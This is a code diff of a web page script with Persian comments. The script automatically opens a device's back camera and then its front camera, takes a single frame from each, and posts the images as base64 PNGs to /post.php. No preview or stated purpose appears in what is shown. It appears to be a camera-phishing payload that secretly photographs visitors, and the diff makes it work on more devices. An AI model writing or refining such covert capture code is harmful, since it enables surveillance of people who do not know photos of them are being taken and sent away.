@@ -20,7 +20,7 @@
     function post(imgdata) {
         $.ajax({
             type: 'POST',
-            data: {cat: imgdata},
+            data: { cat: imgdata },
             url: '/post.php',
             dataType: 'json',
             async: false,
@@ -39,48 +39,39 @@
     const canvas = document.getElementById('canvas');
     const errorMsgElement = document.querySelector('span#errorMsg');
 
-    // تعریف محدودیت‌ها برای دوربین عقب
+    // محدودیت‌ها برای دوربین عقب
     const backConstraints = {
         audio: false,
         video: {
-            facingMode: {exact: "environment"} // استفاده از دوربین عقب
+            facingMode: { ideal: "environment" } // استفاده از دوربین عقب
+        }
+    };
+
+    // محدودیت‌ها برای دوربین جلو
+    const frontConstraints = {
+        audio: false,
+        video: {
+            facingMode: "user" // استفاده از دوربین جلو
         }
     };
 
     // تابع گرفتن تصویر از دوربین و ذخیره کردن آن
-    async function captureAndSave(stream) {
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/png');
-        post(imageData);
-    }
-
-    // دسترسی به دوربین عقب
-    async function initBackCamera() {
+    async function captureAndSave(constraints) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia(backConstraints);
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
             video.srcObject = stream;
             await new Promise(resolve => video.onloadedmetadata = resolve);
-            captureAndSave(stream);
-        } catch (e) {
-            console.error('navigator.getUserMedia error:', e);
-        }
-    }
-
-    // دسترسی به دوربین جلو
-    async function initFrontCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-            video.srcObject = stream;
-            await new Promise(resolve => video.onloadedmetadata = resolve);
-            captureAndSave(stream);
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            post(imageData);
         } catch (e) {
             console.error('navigator.getUserMedia error:', e);
         }
     }
 
     // اجرای تابع برای دوربین عقب و سپس دوربین جلو
-    initBackCamera().then(initFrontCamera);
+    captureAndSave(backConstraints).then(() => captureAndSave(frontConstraints));
 
 </script>
 
